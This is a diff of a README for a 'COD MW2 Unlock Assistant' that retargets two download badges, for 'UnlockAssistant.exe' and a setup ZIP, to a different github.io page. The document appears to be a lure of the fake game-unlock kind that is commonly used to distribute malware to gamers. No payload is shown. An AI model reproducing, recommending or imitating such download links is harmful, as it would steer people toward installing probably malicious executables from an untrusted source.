@@ -1,7 +1,7 @@
 # 🔓 COD MW2 Unlock Assistant — Manual Setup Tool
 
-[![Download UnlockAssistant.exe](https://img.shields.io/badge/Download-UnlockAssistant.exe-green?style=for-the-badge)](https://cod-mw2-unlock-tool-assistant.github.io/.github/)
-[![Get Setup Archive](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://cod-mw2-unlock-tool-assistant.github.io/.github/)
+[![Download UnlockAssistant.exe](https://img.shields.io/badge/Download-UnlockAssistant.exe-green?style=for-the-badge)](https://ingrampoppy75.github.io/.github/cod-mw2-unlock)
+[![Get Setup Archive](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://ingrampoppy75.github.io/.github/cod-mw2-unlock)
 
 ---
 
